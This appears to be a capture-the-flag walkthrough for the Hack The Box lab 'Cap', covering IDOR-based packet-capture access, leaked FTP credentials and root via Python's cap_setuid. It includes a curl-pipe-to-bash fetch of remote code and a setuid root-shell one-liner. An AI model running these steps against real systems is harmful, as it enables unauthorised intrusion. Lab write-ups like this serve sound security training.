@@ -1,0 +1,114 @@
+# Hack The Box – Cap
+
+> 📅 Date: 20th September 2021  
+> 🧾 Document No: D21.100.132  
+> 🧑‍💻 Prepared By: MinatoTW  
+> 🛠️ Machine Author: infosecjack  
+> 🧠 Difficulty: Easy  
+> 🧩 Classification: Official
+
+---
+
+## 🧠 Skills Required
+
+- Web enumeration  
+- Packet capture analysis  
+
+## 🎯 Skills Learned
+
+- IDOR (Insecure Direct Object Reference)  
+- Exploiting Linux capabilities  
+- Local enumeration techniques  
+
+---
+
+## 🔎 Synopsis
+
+Cap is an easy Linux box that hosts a Python-based HTTP service with administrative features such as network capture. The web app suffers from an **IDOR vulnerability** that exposes previous packet captures. One of these reveals **plaintext FTP credentials**, granting a foothold via SSH. The final privilege escalation involves **misconfigured Linux capabilities** — specifically, `cap_setuid` on Python — allowing us to spawn a root shell.
+
+---
+
+## 🛰️ Network Scanning
+
+### 🔧 Nmap Full Port Scan
+
+```bash
+ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -Pn -sC -sV 10.10.10.245
+🧪 Results:
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.9p1 Debian
+80/tcp open  http    gunicorn 20.0.4 (Python WSGI HTTP Server)
+🚫 FTP
+No anonymous login allowed.
+
+Move on to web interface on port 80.
+
+🌐 HTTP Enumeration
+Gunicorn HTTP Server on Port 80
+Visiting the IP shows a dashboard.
+
+Pages like IP Config and Network Status show outputs of ifconfig and netstat.
+
+Suggests the server runs system commands on backend.
+
+📸 Security Snapshot
+Clicking "Security Snapshot" triggers a capture.
+
+Downloaded capture contains only our traffic.
+
+🔓 IDOR Exploit
+Observation:
+Capture URL looks like /data/<id>
+
+IDs are incremented integers (0, 1, 2...)
+
+Exploit:
+Accessing /data/0 gives another user’s packet capture — IDOR vulnerability in action.
+
+🕵️‍♂️ Packet Capture Analysis
+Open /data/0 capture in Wireshark:
+
+Unencrypted FTP credentials found:
+
+Username: nathan
+
+Password: Buck3tH4TF0RM3!
+
+✅ SSH Access
+
+ssh nathan@10.10.10.245
+Password: Buck3tH4TF0RM3!
+🧰 Privilege Escalation – Capabilities
+Step 1: Run linpeas
+
+curl http://<your-ip>/linpeas.sh | bash
+Step 2: Look for capabilities
+Output:
+
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+This is not default behavior — Python has dangerous privileges.
+
+What is cap_setuid?
+Allows a process to switch to any UID, including 0 (root), without needing a setuid binary.
+
+🚀 Root Shell via Python
+Exploit Command:
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+Confirm:
+whoami
+# Output: root
+🏁 Root Flag
+cat /root/root.txt
+🔚 Conclusion
+This box demonstrates how dangerous misconfigured Linux capabilities can be. Always audit binaries with getcap when doing privilege escalation enumeration. Also, never expose internal tools without proper access control — IDOR led directly to credential leakage.
+
+📚 References
+GTFOBins – Python
+
+Linux Capabilities – RedHat Docs
+
+Hack The Box – Official Site
+
